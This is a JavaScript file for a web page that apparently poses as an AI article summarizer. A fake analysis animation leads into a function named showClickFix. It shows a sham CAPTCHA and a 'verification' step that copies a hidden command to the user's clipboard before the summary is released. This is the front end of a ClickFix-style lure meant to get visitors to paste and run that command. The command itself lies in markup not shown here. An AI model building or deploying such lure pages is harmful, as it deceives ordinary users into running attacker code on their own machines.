let generatedSummary = [];

function summarizeText(text) {

let sentences = text.split(/[.!?]/);

sentences = sentences.filter(s => s.trim().length > 25);

return sentences.slice(0,3);

}

function startAI(){

let text = document.getElementById("article").value;

if(text.length < 30){
alert("Please paste article content");
return;
}

generatedSummary = summarizeText(text);

document.getElementById("aiBox").style.display="block";

let message =
"Analyzing article...\n" +
"Extracting key insights...\n" +
"Generating AI summary...\n";

let i = 0;

function type(){

if(i < message.length){

document.getElementById("typing").innerHTML += message.charAt(i);

i++;

setTimeout(type,40);

}else{

setTimeout(function(){

showClickFix();

},1200);

}

}

type();

}

function showClickFix(){

document.getElementById("captchaBox").style.display="block";

}

document.addEventListener("change",function(e){

if(e.target.id==="verify"){

setTimeout(function(){

document.getElementById("captchaBox").style.display="none";

document.getElementById("verification").style.display="block";

},1000);

}

});

function copyCommand(){

let cmd = document.getElementById("cmd").innerText;

navigator.clipboard.writeText(cmd);

let btn = document.getElementById("copyBtn");

btn.innerText="Copied ✓";

}

function verificationComplete(){

document.getElementById("verification").style.display="none";

showSummary();

}

function showSummary(){

document.getElementById("summaryBox").style.display="block";

let ul = document.getElementById("summary");

ul.innerHTML="";

generatedSummary.forEach(function(s){

let li = document.createElement("li");

li.textContent = s.trim();

ul.appendChild(li);

});

}
